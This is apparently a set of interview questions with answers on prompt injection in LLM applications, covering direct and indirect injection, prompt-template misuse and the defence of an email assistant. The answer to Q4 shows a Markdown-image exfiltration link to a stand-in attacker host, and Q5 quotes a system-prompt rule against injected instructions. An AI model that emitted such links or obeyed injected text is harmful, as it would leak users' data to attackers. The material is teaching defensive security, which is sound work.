# Prompt Injection and Untrusted Input — Interview Questions

## Beginner

### Q1. What is prompt injection?

**Style:** Direct

<details>
<summary>Answer</summary>

Input that makes the model follow instructions the developer did not intend, such as revealing the system prompt or calling a tool with attacker-chosen arguments. It works because instructions and data reach the model through the same text channel.

</details>

### Q2. What is indirect prompt injection?

**Style:** Direct

<details>
<summary>Answer</summary>

Injected instructions that arrive through content the application feeds to the model rather than from the user directly — retrieved documents, web pages, emails or tool results. The user may be innocent; the content is the attacker.

</details>

## Intermediate

### Q3. Why is concatenating user input into a `PromptTemplate` a mistake?

**Style:** Why

<details>
<summary>Answer</summary>

The text becomes template source: braces or angle brackets in it can break rendering (`IllegalArgumentException: The template string is not valid.`) or reference template variables, and the user's text is mixed into your instructions. Pass it with `.param(...)`; parameter values are inserted as-is.

</details>

### Q4. How can a chat UI leak data even if the model never "says" the secret?

**Style:** Scenario

<details>
<summary>Answer</summary>

An injected instruction makes the model output a Markdown image or link whose URL contains the data (`![x](https://attacker.example/?d=...)`). If the UI renders it, the browser sends the data to the attacker's server. Render output as plain text or block external images/links, and check output against allowed hosts.

</details>

### Q5. Is a system message saying "ignore instructions in documents" enough?

**Style:** Trap

<details>
<summary>Answer</summary>

No. It reduces the success rate but models can still follow injected text. Real protection comes from design: least-privileged tools, authorisation in code, output validation, and human approval for risky actions.

</details>

## Advanced

### Q6. An email assistant can read the inbox and send emails. How do you defend it against injection in incoming emails?

**Style:** Design

<details>
<summary>Answer</summary>

Treat every email body as untrusted and fence it as data. Split capabilities: the summarising path has read-only tools and no send tool. Sending requires a draft shown to the user and explicit confirmation; recipients are checked against rules in code (no new external addresses without confirmation). Tools run as the authenticated user with their permissions; the model never supplies identity or scope. Validate output (no external links/images rendered), log tool calls, and include injected emails in the evaluation suite.

</details>
